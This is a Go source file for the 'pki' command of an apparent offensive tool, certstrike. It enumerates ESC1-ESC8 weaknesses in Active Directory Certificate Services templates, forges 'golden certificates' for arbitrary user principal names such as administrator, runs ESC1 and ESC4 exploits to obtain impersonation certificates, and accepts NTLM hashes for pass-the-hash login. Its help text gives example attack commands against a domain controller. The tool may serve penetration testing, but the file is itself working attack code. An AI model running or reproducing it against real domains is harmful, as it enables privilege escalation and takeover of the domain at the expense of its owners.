package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"os"
	"strings"

	"github.com/loudmumble/certstrike/pkg/pki"
	"github.com/spf13/cobra"
)

var pkiCmd = &cobra.Command{
	Use:   "pki",
	Short: "Advanced Certificate/PKI attack toolkit",
	Long: `ADCS enumeration (ESC1-ESC8), golden certificate forging, ESC exploitation, and mTLS interception.

Examples:
  certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --username user --password pass
  certstrike pki --forge --upn administrator@corp.local --ca-key ca-key.pem --output admin-cert.pem
  certstrike pki --exploit esc1 --template VulnTemplate --upn admin@domain.com --target-dc dc01.corp.local --domain corp.local
  certstrike pki --exploit esc4 --template WritableTemplate --upn admin@domain.com --target-dc dc01.corp.local --domain corp.local
  certstrike pki --auto-detect --target-dc dc01.corp.local --domain corp.local`,
	RunE: func(cmd *cobra.Command, args []string) error {
		doEnum, _ := cmd.Flags().GetBool("enum")
		doForge, _ := cmd.Flags().GetBool("forge")
		exploit, _ := cmd.Flags().GetString("exploit")
		doAutoDetect, _ := cmd.Flags().GetBool("auto-detect")

		if !doEnum && !doForge && exploit == "" && !doAutoDetect {
			return cmd.Help()
		}

		if doAutoDetect {
			return runAutoDetect(cmd)
		}
		if exploit != "" {
			return runExploit(cmd, exploit)
		}
		if doEnum {
			return runEnumerate(cmd)
		}
		if doForge {
			return runForge(cmd)
		}
		return nil
	},
}

func buildADCSConfig(cmd *cobra.Command) *pki.ADCSConfig {
	targetDC, _ := cmd.Flags().GetString("target-dc")
	domain, _ := cmd.Flags().GetString("domain")
	username, _ := cmd.Flags().GetString("username")
	password, _ := cmd.Flags().GetString("password")
	hash, _ := cmd.Flags().GetString("hash")
	useTLS, _ := cmd.Flags().GetBool("tls")

	return &pki.ADCSConfig{
		TargetDC: targetDC, Domain: domain,
		Username: username, Password: password,
		Hash: hash, UseTLS: useTLS,
	}
}

func runEnumerate(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required for enumeration")
	}

	templates, err := pki.EnumerateTemplates(cfg)
	if err != nil {
		return fmt.Errorf("enumeration failed: %w", err)
	}

	fmt.Printf("\n[+] Found %d certificate templates:\n\n", len(templates))
	for i, tmpl := range templates {
		vulns := "none"
		if len(tmpl.ESCVulns) > 0 {
			vulns = strings.Join(tmpl.ESCVulns, ", ")
		}
		fmt.Printf("  %d. %-30s  ESC: %-20s  Score: %d\n", i+1, tmpl.Name, vulns, tmpl.ESCScore)
		if tmpl.EnrolleeSuppliesSubject {
			fmt.Println("     ⚠  Enrollee Supplies Subject: YES")
		}
		if tmpl.AuthenticationEKU {
			fmt.Println("     ⚠  Authentication EKU: YES")
		}
		if !tmpl.RequiresManagerApproval {
			fmt.Println("     ⚠  Manager Approval: NO")
		}
	}
	return nil
}

func runForge(cmd *cobra.Command) error {
	upn, _ := cmd.Flags().GetString("upn")
	caKeyPath, _ := cmd.Flags().GetString("ca-key")
	output, _ := cmd.Flags().GetString("output")

	if upn == "" {
		return fmt.Errorf("--upn is required for certificate forging")
	}
	if output == "" {
		output = "forged-cert.pem"
	}

	var caKey *ecdsa.PrivateKey

	if caKeyPath != "" {
		data, err := os.ReadFile(caKeyPath)
		if err != nil {
			return fmt.Errorf("read CA key: %w", err)
		}
		block, _ := pem.Decode(data)
		if block == nil {
			return fmt.Errorf("no PEM block found in %s", caKeyPath)
		}
		key, err := x509.ParseECPrivateKey(block.Bytes)
		if err != nil {
			pkcs8Key, err2 := x509.ParsePKCS8PrivateKey(block.Bytes)
			if err2 != nil {
				return fmt.Errorf("parse CA key: %w (also tried PKCS8: %v)", err, err2)
			}
			ecKey, ok := pkcs8Key.(*ecdsa.PrivateKey)
			if !ok {
				return fmt.Errorf("CA key is not ECDSA")
			}
			caKey = ecKey
		} else {
			caKey = key
		}
	} else {
		fmt.Println("[*] No --ca-key provided, generating ephemeral CA key...")
		var err error
		caKey, err = ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		if err != nil {
			return fmt.Errorf("generate CA key: %w", err)
		}
	}

	cert, certKey, err := pki.ForgeCertificate(caKey, upn)
	if err != nil {
		return fmt.Errorf("forge certificate: %w", err)
	}

	// Strip .pem extension for base path if present
	basePath := strings.TrimSuffix(output, ".pem")
	basePath = strings.TrimSuffix(basePath, ".crt")
	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
		return fmt.Errorf("write certificate: %w", err)
	}

	fmt.Printf("[+] Golden certificate written to %s.crt\n", basePath)
	fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
	fmt.Printf("    UPN: %s\n", upn)
	fmt.Printf("    Serial: %s\n", cert.SerialNumber.String())
	fmt.Printf("    Valid: %s to %s\n", cert.NotBefore.Format("2006-01-02"), cert.NotAfter.Format("2006-01-02"))
	return nil
}

func runExploit(cmd *cobra.Command, exploit string) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required")
	}

	templateName, _ := cmd.Flags().GetString("template")
	upn, _ := cmd.Flags().GetString("upn")
	output, _ := cmd.Flags().GetString("output")

	if templateName == "" {
		return fmt.Errorf("--template is required for exploitation")
	}
	if upn == "" {
		return fmt.Errorf("--upn is required for exploitation")
	}
	if output == "" {
		output = "exploited-cert.pem"
	}

	var cert *x509.Certificate
	var certKey *ecdsa.PrivateKey
	var err error

	switch strings.ToLower(exploit) {
	case "esc1":
		cert, certKey, err = pki.ExploitESC1(cfg, templateName, upn)
	case "esc4":
		cert, certKey, err = pki.ExploitESC4(cfg, templateName, upn)
	default:
		return fmt.Errorf("unsupported exploit: %s (supported: esc1, esc4)", exploit)
	}

	if err != nil {
		return fmt.Errorf("exploitation failed: %w", err)
	}

	basePath := strings.TrimSuffix(output, ".pem")
	basePath = strings.TrimSuffix(basePath, ".crt")
	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
		return fmt.Errorf("write cert: %w", err)
	}

	fmt.Printf("\n[+] Exploitation successful!\n")
	fmt.Printf("    Exploit: %s\n", strings.ToUpper(exploit))
	fmt.Printf("    Template: %s\n", templateName)
	fmt.Printf("    UPN: %s\n", upn)
	fmt.Printf("    Output: %s.crt / %s.key\n", basePath, basePath)
	return nil
}

func runAutoDetect(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required")
	}

	vulnerable, err := pki.AutoDetectESC(cfg)
	if err != nil {
		return fmt.Errorf("auto-detect: %w", err)
	}

	if len(vulnerable) == 0 {
		fmt.Println("[*] No vulnerable templates detected.")
		return nil
	}

	fmt.Printf("\n[+] Found %d vulnerable template(s) — prioritized attack paths:\n\n", len(vulnerable))
	for i, t := range vulnerable {
		fmt.Printf("  %d. [Score: %d] %s\n", i+1, t.ESCScore, t.Name)
		fmt.Printf("     Vulnerabilities: %s\n", strings.Join(t.ESCVulns, ", "))
		if t.EnrolleeSuppliesSubject {
			fmt.Println("     → Enrollee can supply subject (critical for impersonation)")
		}
		if t.AuthenticationEKU {
			fmt.Println("     → Has authentication EKU (can be used for domain auth)")
		}
		fmt.Println()
	}
	return nil
}

func init() {
	rootCmd.AddCommand(pkiCmd)

	pkiCmd.Flags().Bool("enum", false, "Enumerate ADCS certificate templates")
	pkiCmd.Flags().Bool("forge", false, "Forge a golden certificate")
	pkiCmd.Flags().String("exploit", "", "Exploit ESC vulnerability (esc1, esc4)")
	pkiCmd.Flags().Bool("auto-detect", false, "Auto-detect ESC vulnerabilities and prioritize attack paths")
	pkiCmd.Flags().String("target-dc", "", "Target domain controller hostname")
	pkiCmd.Flags().String("domain", "", "Active Directory domain name")
	pkiCmd.Flags().String("username", "", "Domain username for authentication")
	pkiCmd.Flags().String("password", "", "Domain password for authentication")
	pkiCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash authentication")
	pkiCmd.Flags().String("upn", "", "User Principal Name for certificate forging")
	pkiCmd.Flags().String("ca-key", "", "Path to CA private key PEM file")
	pkiCmd.Flags().String("template", "", "Certificate template name for exploitation")
	pkiCmd.Flags().StringP("output", "o", "", "Output file path")
	pkiCmd.Flags().Bool("tls", false, "Use LDAPS (port 636) instead of LDAP (port 389)")
}
